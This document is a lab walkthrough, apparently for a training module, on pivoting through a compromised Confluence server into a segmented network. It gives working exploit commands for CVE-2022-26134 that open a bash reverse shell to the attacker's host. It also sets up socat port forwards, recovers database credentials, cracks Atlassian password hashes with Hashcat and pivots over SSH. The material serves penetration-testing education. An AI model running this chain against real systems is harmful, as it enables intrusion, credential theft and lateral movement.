# HTB Module: Port Redirection and SSH Tunneling (Part One)

**Category:** Network segmentation, post-exploitation, pivoting  
**Difficulty:** Intermediate  
**Focus:** Port forwarding with Socat and PostgreSQL access through a dual-homed host

---

## Overview

This module covers **network segmentation**, **internal services that are not directly reachable**, and **port forwarding** using `socat`, `netcat`, and `ssh`. The lab flow is:

- Exploit **Confluence OGNL injection** (CVE-2022-26134)
- Obtain a **reverse shell** on the WAN-facing host `CONFLUENCE01`
- Use **Socat** to forward a port from `CONFLUENCE01` into the DMZ toward PostgreSQL
- **Enumerate PostgreSQL** that is only reachable from the internal segment
- **Recover credentials** from hashes (e.g., with Hashcat)
- **Pivot further** with SSH in Part Two

### Why this matters

Many production networks expose only a small edge surface. Pivoting through a compromised internal-facing interface is a standard requirement for testers and defenders to understand.

---

## Step 1: Network layout

| Layer | Role | Reachable from Kali? |
|--------|------|----------------------|
| **WAN** | Kali and `CONFLUENCE01` | Yes |
| **DMZ** | PostgreSQL on `PGDATABASE01` | Not directly |
| **Bridge** | `CONFLUENCE01` on WAN and DMZ | Yes; use as forward point |

**Objective:** reach `PGDATABASE01` (PostgreSQL) by forwarding through `CONFLUENCE01`.

---

## Step 2: Exploiting CVE-2022-26134 (Confluence OGNL injection)

### Payload concept (OGNL + `ProcessBuilder`)

```bash
curl 'http://<TARGET>:8090/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command(\'bash\',\'-c\',\'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1\').start()")}/'
```

| Piece | Role |
|--------|------|
| `curl` | Sends HTTP GET; Confluence evaluates **OGNL** in the path/query per vulnerable versions |
| `ScriptEngineManager` / `nashorn` | Loads the **JavaScript** engine available on older Confluence/Java stacks |
| `ProcessBuilder` + `bash -c` | Spawns **bash** with a **TCP reverse shell** to `<KALI_IP>:4444` (`/dev/tcp` is a bashism) |

**QC:** URL-encode the payload for real requests (see example below); raw `${` may be mangled by the shell—use **single quotes** around the whole URL so the shell does not expand `$(...)`.

### Lab-specific values

- Replace `<TARGET>` with `CONFLUENCE01` (e.g. `192.168.50.63`)
- Replace `<KALI_IP>` with your Kali host (e.g. `192.168.118.4`)
- Start a listener:

```bash
nc -nvlp 4444
```

| Flag | Meaning |
|------|---------|
| `-l` | Listen |
| `-v` | Verbose (show peers) |
| `-n` | Numeric-only (skip DNS for peer display) |
| `-p 4444` | TCP port (some `nc` builds use `-l -p`; use `nc -h` on your image) |

**QC:** Start the listener **before** triggering the payload; use the same port embedded in the OGNL string.

Example URL-encoded request:

```bash
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

### Shell confirmation

Expected listener output:

```bash
connect to [KALI_IP] from (UNKNOWN) [192.168.50.63]
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$
```

Access is as the unprivileged `confluence` user, which is sufficient to configure forwarding from this host.

---

## Step 3: Reconnaissance from the shell

### Interfaces

```bash
ip addr
```

Shows **interfaces**, **IPv4/IPv6 addresses**, and link state—use it to spot **dual-homed** pivot hosts (WAN vs internal NICs).

Typical mapping:

- `ens192` → `192.168.50.63` (WAN-facing)
- `ens224` → `10.4.50.63` (DMZ-facing)

### Routing

```bash
ip route
```

Shows the **kernel FIB**: which interface and next-hop are used for each prefix—confirms paths toward internal segments (e.g. `10.4.50.0/24`) and the PostgreSQL host (e.g. `10.4.50.215`).

---

## Step 4: PostgreSQL target and Socat forward

`psql` may not be available on `CONFLUENCE01`. Credentials often appear in application configuration, for example:

```xml
<property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
<property name="hibernate.connection.username">postgres</property>
<property name="hibernate.connection.password">D@t4basePassw0rd!</property>
```

**Approach:** bind a port on `CONFLUENCE01` and forward TCP to `PGDATABASE01:5432` with Socat.

### Socat on `CONFLUENCE01`

```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

| Token | Meaning |
|--------|---------|
| `-ddd` | Extra debug (optional; drop to `-d` or omit for quiet runs) |
| `TCP-LISTEN:2345,fork` | Listen on **0.0.0.0:2345**; **`fork`** = new child per connection so multiple clients work |
| `TCP:10.4.50.215:5432` | Upstream PostgreSQL |

**Bind note:** listening on all interfaces exposes the forward on **WAN**—intended here so Kali can reach `192.168.50.63:2345`. For stricter binds use `TCP-LISTEN:192.168.50.63,2345,fork`.

Example log:

```text
listening on AF=2 0.0.0.0:2345
```

**Path:** Kali → `192.168.50.63:2345` → `10.4.50.215:5432`.

---

## Step 5: Connect from Kali with `psql`

```bash
psql -h 192.168.50.63 -p 2345 -U postgres
Password: D@t4basePassw0rd!
```

| Flag | Meaning |
|------|---------|
| `-h` | Host running **Socat** (WAN IP of `CONFLUENCE01`) |
| `-p 2345` | Forwarded port, not the default `5432` on the DB host |
| `-U postgres` | Database role from JDBC/config |

**QC:** Password is typed at the prompt (not on the same line as `-W` would be); avoid shell history by using `PGPASSWORD=` only in controlled labs.

Useful meta-commands:

```sql
postgres=# \l
postgres=# \c confluence
postgres=# \dt
postgres=# SELECT * FROM cwd_user;
```

This completes database enumeration over the forwarded port.

---

## Part Two (preview)

Part Two covers:

- Extracting and cracking user hashes from PostgreSQL
- Using Hashcat on Atlassian-style hashes
- A second Socat forward for **SSH (port 22)**
- SSH to `PGDATABASE01` and retrieving the lab flag

---

# HTB Module: Port Redirection and SSH Tunneling (Part Two)

Part Two assumes Part One is complete: shell on `CONFLUENCE01`, Socat tunnel to PostgreSQL, and read access to the Confluence database.

---

## Step 6: Extract password material from PostgreSQL

Still connected to the `confluence` database through the Socat tunnel.

### User table

```sql
SELECT * FROM cwd_user;
```

Relevant columns include `username`, `email`, and `credential` (password hash).

Example hash format:

```text
{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
```

`{PKCS5S2}` indicates **PBKDF2-SHA1** (Atlassian-style). Hashcat **mode 12001** applies.

---

## Step 7: Hashcat

Save one hash per line in `hashes.txt`, then:

```bash
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
```

| Flag | Meaning |
|------|---------|
| `-m 12001` | **Atlassian `{PKCS5S2}`** / PBKDF2-SHA1 family (verify with `hashcat --example-hashes`) |
| *(positional)* | Wordlist path; default attack mode is straight **wordlist** (`-a 0`) |

**Input file:** one hash per line, as dumped from SQL.

Example recovered lines:

```text
{PKCS5S2}skupO/...:P@ssw0rd!
{PKCS5S2}QkXnk...:sqlpass123
{PKCS5S2}EiMTu...:Welcome1234
```

Example account mapping:

- `rdp_admin` → `P@ssw0rd!`
- `database_admin` → `sqlpass123`
- `hr_admin` → `Welcome1234`

Test recovered passwords where SSH, RDP, or application logins are in scope (credential reuse is common).

---

## Step 8: SSH reachability

- `PGDATABASE01` runs **SSH on port 22** (verify during enumeration).
- Kali cannot reach `10.4.50.215:22` directly.
- Interactive tools may be limited on `PGDATABASE01`; forwarding remains the reliable path.

---

## Step 9: Second Socat forward (SSH)

Stop the previous Socat instance if it is still bound, then on `CONFLUENCE01`:

```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

Same pattern as PostgreSQL: **`TCP-LISTEN:2222,fork`** on the pivot, **`TCP`** to internal **SSH**. No `-ddd` keeps logs smaller.

| Listener on `CONFLUENCE01` | Forwards to |
|----------------------------|-------------|
| `192.168.50.63:2222` (WAN) | `10.4.50.215:22` (SSH on `PGDATABASE01`) |

From Kali:

```bash
ssh database_admin@192.168.50.63 -p 2222
```

| Flag | Meaning |
|------|---------|
| `-p 2222` | Connect to **Socat** listener port on the pivot, not to port 22 on the WAN |

Password (example): `sqlpass123`

```bash
Welcome to Ubuntu 20.04
database_admin@pgdatabase01:~$
```

---

## Step 10: Flag location (lab)

```bash
cat /tmp/socat_flag
```

Example output:

```text
HTB{port_forwarding_makes_firewalls_cry}
```

---

## Summary

| Phase | Action |
|--------|--------|
| External access | OGNL RCE → shell on `CONFLUENCE01` |
| Internal discovery | PostgreSQL URL and credentials from config |
| Port forwarding | Socat: WAN port → `PGDATABASE01:5432` |
| Credentials | Dump hashes; crack with Hashcat |
| SSH pivot | Socat: WAN port → `PGDATABASE01:22` |
| Objective | SSH session and flag under `database_admin` |

---

## Tools referenced

| Tool | Use |
|------|-----|
| `curl` | Deliver OGNL payload |
| `nc` | Catch reverse shell |
| `socat` | TCP port forwarding |
| `psql` | PostgreSQL client from Kali |
| `hashcat` | Offline hash recovery |
| `ssh` | Remote shell on internal host |

---

## Takeaways

- Segmentation reduces direct exposure but not lateral paths through compromised bridges.
- **Port forwarding** exposes internal services to your tooling on a host you control.
- **Database and SSH forwarding** are common second-hop patterns after an edge foothold.

Document each forward (bind address, port, destination) so the chain can be reproduced and torn down safely during testing.
